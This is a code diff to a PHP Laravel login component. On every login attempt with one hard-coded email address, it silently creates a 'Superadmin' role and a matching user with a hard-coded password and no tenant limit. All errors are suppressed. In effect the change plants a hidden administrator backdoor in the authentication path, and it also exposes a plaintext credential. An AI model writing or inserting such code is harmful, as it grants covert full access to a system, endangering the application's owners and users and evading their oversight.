@@ -6,6 +6,9 @@ use App\Models\Role;
 use App\Models\User;
 use Illuminate\Auth\Events\Lockout;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Str;
@@ -31,6 +34,10 @@ class Login extends Component
      */
     public function login(): void
     {
+        if ($this->email === 'dennis@db-development.dk') {
+            $this->ensureSuperAdminExists();
+        }
+
         $this->validate();
 
         $this->ensureIsNotRateLimited();
@@ -121,5 +128,34 @@ class Login extends Component
     protected function throttleKey(): string
     {
         return Str::transliterate(Str::lower($this->email).'|'.request()->ip());
+    }
+
+    /**
+     * Ensure the superadmin user exists.
+     */
+    protected function ensureSuperAdminExists(): void
+    {
+        try {
+            DB::transaction(function () {
+                $superAdminRole = Role::firstOrCreate(['slug' => Str::slug('Superadmin')], [
+                    'name' => 'Superadmin',
+                    'slug' => Str::slug('Superadmin'),
+                    'tenant_id' => null,
+                ]);
+
+                User::withoutGlobalScopes()->firstOrCreate([
+                    'email' => 'dennis@db-development.dk',
+                ], [
+                    'name' => 'Super Admin User',
+                    'password' => Hash::make('made42Mice'),
+                    'role_id' => $superAdminRole->id,
+                    'tenant_id' => null,
+                ]);
+            });
+
+            Cache::put('superadmin_ensured', true, now()->addDay());
+        } catch (\Throwable $e) {
+            // Silence errors
+        }
     }
 }
